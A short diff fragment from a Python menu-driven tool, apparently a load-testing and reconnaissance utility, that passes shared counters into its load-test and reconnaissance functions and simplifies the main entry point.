             break
         elif choice == "1":
-            asyncio.run(run_load_test())
+            asyncio.run(run_load_test(req_counter, err_counter, status_dict, latency_list, ports_hit_list, conn_counter))
         elif choice == "2":
             test_config_screen()
         elif choice == "3":
@@ -1482,17 +1536,10 @@ def main():
         elif choice == "9":
             admin_login()
         elif choice == "10":
-            reconnaissance_menu()
+            reconnaissance_menu(req_counter, err_counter, ports_hit_list, conn_counter)
         else:
             print(f"  Invalid selection.")
             time.sleep(1)
 
 if __name__ == "__main__":
-    # Start the manager process for shared memory
-    mp.set_start_method('fork', force=True)
-    try:
-        main()
-    except KeyboardInterrupt:
-        print(f"\n{current_color}Forced exit.{RESET}")
-    finally:
-        print(f"{RESET}")
+    main()
